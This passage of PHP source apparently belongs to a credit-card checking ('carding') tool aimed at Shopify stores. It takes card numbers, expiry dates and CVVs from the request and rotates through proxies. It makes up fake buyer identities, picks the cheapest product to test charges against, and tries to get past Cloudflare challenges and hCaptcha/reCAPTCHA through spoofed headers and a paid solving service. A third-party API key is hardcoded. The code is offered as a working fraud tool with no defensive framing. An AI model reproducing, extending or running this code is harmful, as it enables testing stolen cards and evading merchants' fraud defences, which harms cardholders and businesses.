    foreach ($chunks as $chunk) {
        $mh = curl_multi_init();
        $handles = [];

        foreach ($chunk as $proxyStr) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
            curl_setopt($ch, CURLOPT_ENCODING, '');
            curl_setopt($ch, CURLOPT_TCP_NODELAY, true);

            // Proxy setup
            $type = 'http';
            $proxyAddr = $proxyStr;
            if (preg_match('/^(https?|socks4|socks5):\/\/(.+)$/i', $proxyStr, $m)) {
                $type = strtolower($m[1]);
                $proxyAddr = $m[2];
            }
            curl_setopt($ch, CURLOPT_PROXY, $proxyAddr);
            if ($type === 'socks4') curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
            elseif ($type === 'socks5') curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            elseif ($type === 'https') curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);
            else curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

            $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) ?: 'http');
            $needsTunnel = ($scheme === 'https' && ($type === 'http' || $type === 'https'));
            curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, $needsTunnel);
            curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
            if (defined('CURLOPT_PROXYHEADER') && ($type === 'http' || $type === 'https')) {
                curl_setopt($ch, CURLOPT_PROXYHEADER, ['Proxy-Connection: Keep-Alive']);
            }

            curl_multi_add_handle($mh, $ch);
            $handles[] = ['h' => $ch, 'proxy' => $proxyStr];
        }

        $running = null;
        do {
            $mrc = curl_multi_exec($mh, $running);
            if ($running) curl_multi_select($mh, 1.0);
        } while ($running && $mrc == CURLM_OK);

        $winner = null;
        foreach ($handles as $entry) {
            $ch = $entry['h'];
            $resp = curl_multi_getcontent($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            if ($resp !== false && $code >= 200 && $code < 500 && $winner === null) {
                $winner = $entry['proxy'];
            }
            curl_multi_remove_handle($mh, $ch);
            curl_close($ch);
        }
        curl_multi_close($mh);

        if ($winner !== null) return $winner;
    }
    return null;
}

function add_proxy_details_to_result(array $result_data, bool $proxy_used, string $proxy_ip, string $proxy_port): array {
    // Check if detailed/full response format is requested (default is now simplified)
    $useDetailed = isset($_GET['detailed']) || isset($_GET['full']) || isset($_GET['verbose']);
    
    // Preserve explicit ProxyStatus if already set; otherwise infer from usage
    if (!isset($result_data['ProxyStatus'])) {
        $result_data['ProxyStatus'] = ($proxy_used ? 'Live' : 'Dead');
    }
    $result_data['ProxyIP'] = ($proxy_used ? ($proxy_ip . ($proxy_port !== '' ? ':' . $proxy_port : '')) : 'N/A');

    // If simplified mode (default), only return essential fields
    if (!$useDetailed) {
        $simplified = [
            'Response' => $result_data['Response'] ?? '',
            'ProxyStatus' => $result_data['ProxyStatus'],
            'ProxyIP' => $result_data['ProxyIP']
        ];
        
        // Include Price if available
        if (isset($result_data['Price'])) {
            $simplified['Price'] = $result_data['Price'];
        }
        
        // Always include Gateway (even if unknown)
        if (isset($result_data['Gateway'])) {
            $simplified['Gateway'] = $result_data['Gateway'];
        }
        
        // Include execution time if available
        if (isset($GLOBALS['start_time'])) {
            $time_taken = round(microtime(true) - $GLOBALS['start_time'], 2);
            $simplified['Time'] = $time_taken . 's';
        }
        
        // Include curl error if present
        if (isset($result_data['curl_error'])) {
            $simplified['curl_error'] = $result_data['curl_error'];
        }
        
        return $simplified;
    }

    $proxyBlock = [
        'used' => $proxy_used,
        'status' => $result_data['ProxyStatus'],
        'ip' => $proxy_used ? $proxy_ip : null,
        'port' => $proxy_used && $proxy_port !== '' ? (int) $proxy_port : null,
        'string' => $proxy_used ? trim($proxy_ip . ($proxy_port !== '' ? ':' . $proxy_port : '')) : null,
    ];
    $result_data['proxy'] = $proxyBlock;

    $primaryGateway = $GLOBALS['__gateway_primary'] ?? GatewayDetector::unknown();
    $gatewayCandidates = $GLOBALS['__gateway_candidates'] ?? [$primaryGateway];
    if ((!isset($result_data['Gateway']) || trim((string)$result_data['Gateway']) === '') && isset($primaryGateway['label'])) {
        $result_data['Gateway'] = $primaryGateway['label'];
    }
    if (!isset($result_data['GatewayId']) && isset($primaryGateway['id'])) {
        $result_data['GatewayId'] = $primaryGateway['id'];
    }
    $result_data['gateway'] = [
        'primary' => $primaryGateway,
        'candidates' => $gatewayCandidates,
    ];

    if (isset($GLOBALS['__payment_context']) && is_array($GLOBALS['__payment_context'])) {
        $result_data['payment'] = $GLOBALS['__payment_context'];
        if (!isset($result_data['Currency']) && isset($GLOBALS['__payment_context']['currency'])) {
            $result_data['Currency'] = $GLOBALS['__payment_context']['currency'];
        }
    }

    $durationMs = null;
    if (isset($GLOBALS['start_time'])) {
        $durationMs = round((microtime(true) - $GLOBALS['start_time']) * 1000, 2);
    }
    $result_data['_meta'] = [
        'generated_at' => gmdate('c'),
        'duration_ms' => $durationMs,
        'version' => '2025.11-gateway-plus',
    ];

    return $result_data;
}

function send_final_response(array $result_data, bool $proxy_used, string $proxy_ip, string $proxy_port) {
    // Cleanup per-request cookie file if present
    if (isset($GLOBALS['__cookie_file']) && is_string($GLOBALS['__cookie_file'])) {
        $cf = $GLOBALS['__cookie_file'];
        if (is_file($cf)) { @unlink($cf); }
    }
    $final_payload = add_proxy_details_to_result($result_data, $proxy_used, $proxy_ip, $proxy_port);
    if (!headers_sent()) {
        header('Content-Type: application/json; charset=utf-8');
    }
    $jsonOptions = JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES;
    if (isset($_GET['pretty']) || isset($_GET['format']) && strtolower((string)$_GET['format']) === 'json_pretty') {
        $jsonOptions |= JSON_PRETTY_PRINT;
    }
    echo json_encode($final_payload, $jsonOptions);
    exit;
}

$proxy_ip = '';
$proxy_port = '';
$proxy_user = '';
$proxy_pass = '';
$proxy_type = 'http'; // Default proxy type
$proxy_status = 'N/A'; // Default status
$proxy_used = false;

// Check for noproxy parameter (bypasses all proxy usage)
$noproxy_requested = isset($_GET['noproxy']);
// Optional: require proxy strictly, otherwise fallback to direct when none available
$require_proxy = false;
if (isset($_GET['requireProxy'])) {
    $val = strtolower((string)$_GET['requireProxy']);
    $require_proxy = ($val === '1' || $val === 'true');
}

if ($noproxy_requested) {
    // User explicitly requested no proxy - use direct IP
    $proxy_used = false;
    $proxy_status = 'Bypassed (direct IP)';
} elseif (isset($_GET['proxy']) && !empty($_GET['proxy'])) {
    $rawProxy = trim((string)$_GET['proxy']);
    $hasScheme = preg_match('/^(https?|socks5h?|socks4a?|socks[45]):\/\//i', $rawProxy);
    $pc = parse_proxy_components($rawProxy);
    $proxy_type = $pc['type'];
    $proxy_ip = $pc['host'];
    $proxy_port = $pc['port'];
    $proxy_user = $pc['user'];
    $proxy_pass = $pc['pass'];

    if ($proxy_ip !== '' && $proxy_port !== '') {
        if (!$hasScheme) {
            // Auto-detect proxy type by testing all protocols (prefer target site)
            $detectedType = detect_proxy_type($proxy_ip, $proxy_port, $proxy_user, $proxy_pass, $__requested_site_for_test);
            if ($detectedType) {
                $proxy_type = $detectedType;
                $proxy_status = "Live (auto-detected: $detectedType)";
                $proxy_used = true;
                save_proxy_to_file(normalize_proxy_string($proxy_type, $proxy_ip, $proxy_port, $proxy_user, $proxy_pass), 'ProxyList.txt');
            } else {
                $proxy_status = 'Dead';
                $proxy_used = false;
                send_final_response([
                    'Response' => 'Proxy failed validation with all protocols (socks5/socks5h, http, socks4/socks4a, https). Check if proxy is online or supports HTTPS tunneling.',
                    'ProxyStatus' => $proxy_status,
                    'ProxyIP' => $proxy_ip . ':' . $proxy_port,
                    'TestedProtocols' => ['socks5','socks5h','http','socks4','socks4a','https']
                ], false, $proxy_ip, $proxy_port);
            }
        } else {
            // Scheme provided: trust SOCKS quickly; validate HTTP/HTTPS
            if (strpos($proxy_type, 'socks') === 0) {
                $proxy_status = 'Live (trusted)';
                $proxy_used = true;
                save_proxy_to_file(normalize_proxy_string($proxy_type, $proxy_ip, $proxy_port, $proxy_user, $proxy_pass), 'ProxyList.txt');
            } elseif (test_proxy($proxy_ip, $proxy_port, $proxy_user, $proxy_pass, $proxy_type)) {
                $proxy_status = 'Live';
                $proxy_used = true;
                save_proxy_to_file(normalize_proxy_string($proxy_type, $proxy_ip, $proxy_port, $proxy_user, $proxy_pass), 'ProxyList.txt');
            } else {
                $proxy_status = 'Dead';
                $proxy_used = false;
                send_final_response([
                    'Response' => 'Provided HTTP/HTTPS proxy failed validation. Try auto-detection by removing scheme prefix.',
                    'ProxyStatus' => $proxy_status,
                    'ProxyIP' => $proxy_ip . ':' . $proxy_port,
                    'ProxyType' => $proxy_type
                ], false, $proxy_ip, $proxy_port);
            }
        }
    } else {
        $proxy_status = 'Invalid Format';
    }
}

// If no proxy provided and noproxy not set, auto-pick a working one from ProxyList.txt using parallel testing
if (!$noproxy_requested && !$proxy_used && (!isset($_GET['proxy']) || empty($_GET['proxy']))) {
    // If we know the site already, prefer selecting a proxy that can reach it; fallback to generic
    $siteParam = filter_input(INPUT_GET, 'site', FILTER_SANITIZE_URL);
    $candidate = null;
    if (!empty($siteParam)) {
        $host = parse_url($siteParam, PHP_URL_HOST);
        $siteUrl = 'https://' . $host;
        $candidate = select_working_proxy_for_url('ProxyList.txt', $siteUrl, 2);
    }
    $autoProxy = $candidate ?: select_working_proxy_parallel('ProxyList.txt', 3);
    if ($autoProxy) {
        // Parse into components
        $ptype = 'http';
        $addr = $autoProxy;
        if (preg_match('/^(https?|socks4|socks5):\/\/(.+)$/i', $autoProxy, $m)) {
            $ptype = strtolower($m[1]);
            $addr = $m[2];
        }
        $parts = explode(':', $addr);
        if (count($parts) >= 2) {
            $proxy_ip = $parts[0];
            $proxy_port = $parts[1];
            if (count($parts) >= 4) { $proxy_user = $parts[2]; $proxy_pass = $parts[3]; }
            $proxy_type = $ptype;
            $proxy_used = true;
            $proxy_status = 'Live';
        }
    }
}

// If proxy isn't used (none provided or all invalid) and user didn't force proxy, fall back to direct
if (!$noproxy_requested && !$proxy_used && !$require_proxy) {
    $proxy_used = false; // proceed without proxy
}
// If proxy is required strictly and none is available, stop with clear message
if (!$noproxy_requested && !$proxy_used && $require_proxy) {
    $proxyCount = file_exists('ProxyList.txt') ? count(file('ProxyList.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)) : 0;
    send_final_response([
        'Response' => 'No working proxy available and requireProxy=1. Update ProxyList.txt, provide ?proxy=scheme://ip:port, or remove requireProxy to proceed direct.',
        'ProxyStatus' => 'Dead',
        'ProxyIP' => 'N/A',
        'ProxiesInFile' => $proxyCount
    ], false, '', '');
}


// Validate CC parameter - support both pipe-separated and individual parameters
$cc1 = request_string('cc');
if (empty($cc1)) {
    send_final_response(['Response' => 'CC parameter is required'], false, '', '');
}

// Check if pipe-separated format is used
if (strpos($cc1, '|') !== false) {
    $cc_partes = explode("|", $cc1);
    
    if (count($cc_partes) < 4) {
        send_final_response(['Response' => 'Invalid CC format. Use: cc|month|year|cvv or separate parameters (cc, mm, yy, cvv)'], false, '', '');
    }
    
    $cc = $cc_partes[0];
    $month = $cc_partes[1];
    $year = $cc_partes[2];
    $cvv = $cc_partes[3];
} else {
    // Support individual parameters
    $cc = $cc1;
    $month = request_string('mm');
    $year = request_string('yy');
    $cvv = request_string('cvv');
    
    // Validate all required parameters are present
    if (empty($cc) || empty($month) || empty($year) || empty($cvv)) {
        send_final_response(['Response' => 'Missing required parameters. Provide: cc|month|year|cvv OR cc=X&mm=X&yy=X&cvv=X'], false, '', '');
    }
}

// Check CC BIN/host information
$cc_info = check_cc_bin($cc);
if (!$cc_info['valid']) {
    send_final_response([
        'Response' => 'Invalid CC - Failed Luhn check',
        'CC_Info' => $cc_info
    ], false, '', '');
}

// Log CC information if debug is enabled
if (isset($_GET['debug'])) {
    error_log("[CC_CHECK] BIN: {$cc_info['bin']}, Brand: {$cc_info['brand']}, Country: {$cc_info['country_name']}, Bank: {$cc_info['bank']}");
}

/*=====  sub_month  ======*/
$yearcont=strlen($year);
if ($yearcont<=2){
$year = "20$year";
}
if($month == "01"){
$sub_month = "1";
}elseif($month == "02"){
$sub_month = "2";
}elseif($month == "03"){
$sub_month = "3";
}elseif($month == "04"){
$sub_month = "4";
}elseif($month == "05"){
$sub_month = "5";
}elseif($month == "06"){
$sub_month = "6";
}elseif($month == "07"){
$sub_month = "7";
}elseif($month == "08"){
$sub_month = "8";
}elseif($month == "09"){
$sub_month = "9";
}elseif($month == "10"){
$sub_month = "10";
}elseif($month == "11"){
$sub_month = "11";
}elseif($month == "12"){
$sub_month = "12";
}

// HYPER-SPEED: Skip geocoding API call to save 1-2 seconds
// Use default coordinates based on state/zip or fallback to NYC
// Shopify doesn't strictly validate coordinates, so approximation is fine
$lat = 40.7128; // New York default
$lon = -74.0060;

// Simple state-to-coordinates mapping for better accuracy (optional, quick lookup)
$stateCoords = [
    'CA' => [34.0522, -118.2437], // Los Angeles
    'TX' => [29.7604, -95.3698],  // Houston
    'FL' => [25.7617, -80.1918],  // Miami
    'NY' => [40.7128, -74.0060],  // NYC
    'IL' => [41.8781, -87.6298],  // Chicago
];

if (isset($stateCoords[$state_us])) {
    [$lat, $lon] = $stateCoords[$state_us];
}

// Only use geocoding API if explicitly requested via query parameter
if (isset($_GET['use_geocoding']) && $_GET['use_geocoding'] === '1') {
    $geoaddressParts = array_filter([
        $num_us !== '' ? $num_us : null,
        $address_us,
        $city_us,
        $state_us,
        $zip_us,
        $country_code
    ]);
    $geoaddress = urlencode(implode(', ', array_filter(array_map('trim', $geoaddressParts))));
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://us1.locationiq.com/v1/search?key=pk.87eafaf1c832302b01301bf903d7897e&q='.$geoaddress.'&format=json');
    apply_proxy_if_used($ch, 'https://us1.locationiq.com/v1/search');
    apply_common_timeouts($ch);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $geocoding = curl_exec($ch);
    curl_close($ch);
    
    $geocoding_data = json_decode($geocoding, true);
    if ($geocoding_data && is_array($geocoding_data) && isset($geocoding_data[0])) {
        $lat = (float) $geocoding_data[0]['lat'];
        $lon = (float) $geocoding_data[0]['lon'];
    }
}

// echo "<li>lat: $lat<li>";
// echo "<li>lon: $lon<li>";

// HYPER-SPEED: Generate random names locally instead of API call (saves 1-2 seconds)
// Only use random user API if explicitly requested
$needsRandomProfile = ($firstname === '' || $lastname === '' || $email === '');
if ($needsRandomProfile) {
    // Use local name generation for speed (no API call)
    $firstNames = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Lisa', 'James', 'Mary', 'Robert', 'Jennifer'];
    $lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez'];
    
    if ($firstname === '') {
        $firstname = $firstNames[array_rand($firstNames)];
    }
    if ($lastname === '') {
        $lastname = $lastNames[array_rand($lastNames)];
    }
    if ($email === '') {
        $email = strtolower($firstname . '.' . $lastname . mt_rand(100, 999)) . '@gmail.com';
    }
    
    // Only use randomuser.me API if explicitly requested via query parameter
    if (isset($_GET['use_random_api']) && $_GET['use_random_api'] === '1') {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
        apply_proxy_if_used($ch, 'https://randomuser.me/api');
        apply_common_timeouts($ch);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $resposta = curl_exec($ch);
        curl_close($ch);

        if ($resposta !== false && $resposta !== null) {
            $candidate = find_between($resposta, '"first":"', '"');
            if ($candidate !== '') {
                $firstname = $candidate;
            }
            $candidate = find_between($resposta, '"last":"', '"');
            if ($candidate !== '') {
                $lastname = $candidate;
            }
            $candidate = find_between($resposta, '"email":"', '"');
            if ($candidate !== '') {
                $email = $candidate;
            }
        }
    }
}

if ($email === '') {
    $email = 'autosh-' . substr(hash('crc32', microtime(true) . mt_rand()), 0, 8) . '@gmail.com';
}
if ($cardholder_name === '') {
    $cardholder_name = trim(($firstname !== '' ? $firstname : 'John') . ' ' . ($lastname !== '' ? $lastname : 'Doe'));
}

function getMinimumPriceProductDetails(string $json): array {
    $data = json_decode($json, true);
    
    if (!is_array($data) || !isset($data['products']) || !is_array($data['products'])) {
        throw new Exception('Invalid JSON format or missing/invalid products key');
    }

    // Initialize minPrice as null to find the minimum valid price (above 0.01)
    $minPrice = null;
    $minPriceDetails = [
        'id' => null,
        'price' => null,
        'title' => null,
    ];

    foreach ($data['products'] as $product) {
        // Check if 'variants' key exists and is an array
        if (!isset($product['variants']) || !is_array($product['variants'])) {
            continue; // Skip this product if variants are missing or not an array
        }
        foreach ($product['variants'] as $variant) {
            // Check if 'price' key exists
            if (!isset($variant['price'])) {
                continue; // Skip this variant if price is missing
            }
            $price = (float) $variant['price'];
            // Skip prices below 0.01 (including 0.00)
            if ($price >= 0.01) {
                // If minPrice is null or the current price is lower than minPrice, update minPriceDetails
                if ($minPrice === null || $price < $minPrice) {
                    $minPrice = $price;
                    $minPriceDetails = [
                        'id' => $variant['id'] ?? null, // Use null coalescing operator for safer access
                        'price' => $variant['price'] ?? null,
                        'title' => $product['title'] ?? null,
                    ];
                }
            }
        }
    }

    // If no valid price was found, return an error message or keep minPriceDetails as null.
    if ($minPrice === null) {
        throw new Exception('No products found with price greater than or equal to 0.01');
    }

    return $minPriceDetails;
}

/**
 * Detect if response contains Cloudflare challenge
 */
function is_cloudflare_challenge(string $body, int $httpCode): bool {
    if ($httpCode == 403 || $httpCode == 503) {
        $bodyLower = strtolower($body);
        // Check for various Cloudflare challenge indicators
        if (strpos($bodyLower, 'cloudflare') !== false || 
            strpos($bodyLower, 'cf-ray') !== false ||
            strpos($bodyLower, 'cf_clearance') !== false ||
            strpos($bodyLower, 'checking your browser') !== false ||
            strpos($bodyLower, 'please wait while we check your browser') !== false ||
            strpos($bodyLower, 'ddos protection by cloudflare') !== false ||
            strpos($bodyLower, '__cf_chl_jschl_tk__') !== false ||
            strpos($bodyLower, 'challenge-platform') !== false) {
            return true;
        }
    }
    return false;
}

/**
 * Detect if response contains captcha challenge
 */
function is_captcha_challenge(string $body): bool {
    $bodyLower = strtolower($body);
    return (strpos($bodyLower, 'hcaptcha') !== false || 
            strpos($bodyLower, 'recaptcha') !== false || 
            strpos($bodyLower, 'g-recaptcha') !== false ||
            strpos($bodyLower, 'captcha-challenge') !== false ||
            strpos($bodyLower, 'data-sitekey') !== false);
}

/**
 * Solve captcha using multiple methods (internal first, then 2Captcha API)
 */
function solve_captcha_challenge(string $html, string $url, ?string $cookieFile = null): array {
    global $twoCaptchaSolver, $advancedCaptchaSolver;
    
    // Detect captcha type
    $captchaInfo = CaptchaSolver::detectCaptcha($html);
    
    if (empty($captchaInfo)) {
        return ['success' => false, 'error' => 'No captcha detected'];
    }
    
    // Try internal solving first (fast, free)
    foreach ($captchaInfo as $type => $info) {
        if ($type === 'hcaptcha' && isset($info['sitekey'])) {
            error_log("[Captcha] Trying internal hCaptcha bypass...");
            
            // Try header skip first
            $skip = CaptchaSolver::tryHeaderSkip($url, $cookieFile);
            if ($skip['success']) {
                return ['success' => true, 'method' => 'header_skip', 'body' => $skip['response']];
            }
            
            // Fall back to 2Captcha API
            error_log("[Captcha] Internal bypass failed, using 2Captcha API for hCaptcha...");
            $solution = $twoCaptchaSolver->solveHCaptcha($info['sitekey'], $url);
            if ($solution['success']) {
                return ['success' => true, 'method' => '2captcha', 'token' => $solution['token']];
            }
        }
        
        if (($type === 'recaptcha_v2' || $type === 'recaptcha') && isset($info['sitekey'])) {
            error_log("[Captcha] Trying internal reCAPTCHA v2 bypass...");
            
            // Try header skip first
            $skip = CaptchaSolver::tryHeaderSkip($url, $cookieFile);
            if ($skip['success']) {
                return ['success' => true, 'method' => 'header_skip', 'body' => $skip['response']];
            }
            
            // Fall back to 2Captcha API
            error_log("[Captcha] Internal bypass failed, using 2Captcha API for reCAPTCHA v2...");
            $solution = $twoCaptchaSolver->solveRecaptchaV2($info['sitekey'], $url);
            if ($solution['success']) {
                return ['success' => true, 'method' => '2captcha', 'token' => $solution['token']];
            }
        }
        
        if ($type === 'recaptcha_v3' && isset($info['sitekey'])) {
            error_log("[Captcha] Using 2Captcha API for reCAPTCHA v3...");
            $solution = $twoCaptchaSolver->solveRecaptchaV3($info['sitekey'], $url);
            if ($solution['success']) {
                return ['success' => true, 'method' => '2captcha', 'token' => $solution['token']];
            }
        }
    }
    
    return ['success' => false, 'error' => 'All captcha solving methods failed'];
}

/**
 * Enhanced HTTP GET with Cloudflare and captcha handling
 */
function http_get_with_cf_bypass(string $url, ?string $cookieFile = null, array $headers = [], int $maxRetries = 2, int $timeout = 8, int $connectTimeout = 5): array {
    $attempt = 0;
    
    while ($attempt < $maxRetries) {
        [$body, $code] = http_get_with_proxy($url, $cookieFile, $headers, $timeout, $connectTimeout);
        
        // Check for Cloudflare challenge
        if (is_cloudflare_challenge($body, $code)) {
            error_log("[CF-Bypass] Cloudflare challenge detected on $url, attempt " . ($attempt + 1));
            
            // Add Cloudflare bypass headers
            $cfHeaders = array_merge($headers, [
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.9',
                'Accept-Encoding: gzip, deflate, br',
                'Connection: keep-alive',
                'Upgrade-Insecure-Requests: 1',
                'Sec-Fetch-Dest: document',
                'Sec-Fetch-Mode: navigate',
                'Sec-Fetch-Site: none',
                'Cache-Control: max-age=0'
            ]);
            
            // Wait a bit before retry (Cloudflare expects this) - OPTIMIZED for speed
            usleep(50000); // 0.05 seconds (ultra-fast)
            [$body, $code] = http_get_with_proxy($url, $cookieFile, $cfHeaders, $timeout, $connectTimeout);
            
            // If still challenged, return what we have
            if (!is_cloudflare_challenge($body, $code)) {
                return [$body, $code];
            }
        }
        
        // Check for captcha
        if (is_captcha_challenge($body)) {
            error_log("[Captcha] Captcha detected on $url, attempt " . ($attempt + 1));
            
            // Try comprehensive captcha solving
            $solution = solve_captcha_challenge($body, $url, $cookieFile);
            if ($solution['success']) {
                if (isset($solution['body'])) {
                    return [$solution['body'], 200];
                } elseif (isset($solution['token'])) {
                    // Token received, but we need to inject it somehow
                    // For now, return original body with metadata
                    error_log("[Captcha] Captcha solved with token: " . substr($solution['token'], 0, 20) . "...");
                    // In a real scenario, you'd inject this token into the page/form
                }
            }
        }
        
        // If no challenge or bypass successful, return
        if ($code >= 200 && $code < 400) {
            return [$body, $code];
        }
        
        $attempt++;
        if ($attempt < $maxRetries) {
            usleep(50000); // 0.05 seconds between retries (ultra-fast)
        }
    }
    
    return [$body, $code];
}

// Lightweight HTTP GET returning [body, code]
// HYPER-FAST: Maximum speed optimization
function http_get_with_proxy(string $url, ?string $cookieFile = null, array $headers = [], int $timeout = 8, int $connectTimeout = 5) : array {
    // fresh UA per request
    $dynamicUA = (function(){ static $uaGen=null; if($uaGen===null){$uaGen = new userAgent();} return $uaGen->generate('windows'); })();
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout); // OPTIMIZED: Accept timeout parameter, default 8s
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connectTimeout); // OPTIMIZED: Accept connect timeout parameter, default 5s
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_ENCODING, ''); // Enable compression
    curl_setopt($ch, CURLOPT_TCP_NODELAY, true); // Disable Nagle's algorithm for faster small packet transmission
    if ($cookieFile) {
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    }
    $defaultHeaders = [
        'User-Agent: '.flow_user_agent(),
        'Accept: application/json, text/javascript, */*; q=0.1',
        'Accept-Language: en-US,en;q=0.9',
        'Accept-Encoding: gzip, deflate, br',
        'Referer: '.(parse_url($url, PHP_URL_SCHEME) . '://' . parse_url($url, PHP_URL_HOST) . '/'),
        'X-Requested-With: XMLHttpRequest',
        'Connection: keep-alive'
    ];
    curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($defaultHeaders, $headers));
    apply_proxy_if_used($ch, $url);
    $body = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return [$body, $code];
}

// Parallel HTTP GET for multiple URLs (same headers/cookies) using curl_multi
// Returns assoc array url => [body, code]
// HYPER-FAST: Maximum speed with aggressive parallelism
function multi_http_get_with_proxy(array $urls, ?string $cookieFile = null, array $headers = [], int $timeout = 6, int $connectTimeout = 3): array {
    $mh = curl_multi_init();
    curl_multi_setopt($mh, CURLMOPT_PIPELINING, CURLPIPE_MULTIPLEX); // Enable HTTP/2 multiplexing if available
    curl_multi_setopt($mh, CURLMOPT_MAX_HOST_CONNECTIONS, 15); // HYPER-FAST: Increased from 10 to 15 for max parallelism
    curl_multi_setopt($mh, CURLMOPT_MAX_TOTAL_CONNECTIONS, 100); // HYPER-FAST: Increased from 50 to 100
    
    $handles = [];
    foreach ($urls as $url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connectTimeout);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        if ($cookieFile) {
            curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
            curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
        }
        $defaultHeaders = [
            'User-Agent: '.flow_user_agent(),
            'Accept: application/json, text/javascript, */*; q=0.1',
            'Accept-Language: en-US,en;q=0.9',
            'Accept-Encoding: gzip, deflate, br',
            'Referer: '.(parse_url($url, PHP_URL_SCHEME) . '://' . parse_url($url, PHP_URL_HOST) . '/'),
            'Connection: keep-alive',
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Site: same-origin'
        ];
        curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($defaultHeaders, $headers));
        // Apply proxy and performance flags similar to http_get_with_proxy
        curl_setopt($ch, CURLOPT_ENCODING, '');
        curl_setopt($ch, CURLOPT_TCP_NODELAY, true);
        curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 180); // Increased DNS cache
        curl_setopt($ch, CURLOPT_FRESH_CONNECT, false);
        curl_setopt($ch, CURLOPT_FORBID_REUSE, false);
        apply_proxy_if_used($ch, $url);

        curl_multi_add_handle($mh, $ch);
        $handles[] = ['h' => $ch, 'u' => $url];
    }

    $running = null;
    do {
        $mrc = curl_multi_exec($mh, $running);
        if ($running) {
            curl_multi_select($mh, 0.05); // HYPER-FAST: Reduced from 0.1 to 0.05 for even faster response
        }
    } while ($running && $mrc == CURLM_OK);

    $out = [];
    foreach ($handles as $entry) {
        $ch = $entry['h'];
        $url = $entry['u'];
        $body = curl_multi_getcontent($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $out[$url] = [$body, $code];
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }
    curl_multi_close($mh);
    return $out;
}

// Chunked variant: fetch many URLs in batches to limit concurrency (default batch size 10)
function multi_http_get_with_proxy_chunked(array $urls, ?string $cookieFile = null, array $headers = [], int $timeout = 3, int $connectTimeout = 2, int $batchSize = 10): array {
    $out = [];
    if (empty($urls)) return $out;
    if ($batchSize <= 1 || count($urls) <= $batchSize) { 
        return multi_http_get_with_proxy($urls, $cookieFile, $headers, $timeout, $connectTimeout); 
    }
    $chunks = array_chunk($urls, $batchSize);
    foreach ($chunks as $chunk) {
        $res = multi_http_get_with_proxy($chunk, $cookieFile, $headers, $timeout, $connectTimeout);
        $out = array_merge($out, $res); // Use array_merge to maintain keys properly
    }
    return $out;
}

// Simple in-memory cache for products (valid for 5 minutes)
$GLOBALS['__products_cache'] = $GLOBALS['__products_cache'] ?? [];

/**
 * Try to fetch products from multiple Shopify JSON endpoints
 *
 * @throws Exception when no real product data can be retrieved
 */
function fetchProductsJson(string $baseUrl, ?string $cookieFile = null) : array {
    // Check cache first (5 minute TTL)
    $cacheKey = md5($baseUrl);
    if (isset($GLOBALS['__products_cache'][$cacheKey])) {
        $cached = $GLOBALS['__products_cache'][$cacheKey];
        if (time() - $cached['time'] < 300) { // 5 minutes
            return $cached['data'];
        }
    }
    
    // Get max strategies limit from config (default 3 for speed)
    $cfg = runtime_cfg();
    $maxStrategies = $cfg['max_strategies'] ?? 3;
    $strategiesAttempted = 0;

    // Strategy 0: Direct approach (like old implementation) - FASTEST and most reliable
    // Try direct /products.json with proper headers and CF bypass first
    $directHeaders = [
        'User-Agent: '.flow_user_agent(),
        'Accept: application/json',
        'Accept-Language: en-US,en;q=0.9',
        'Accept-Encoding: gzip, deflate, br',
        'Connection: keep-alive',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: same-origin'
    ];
    
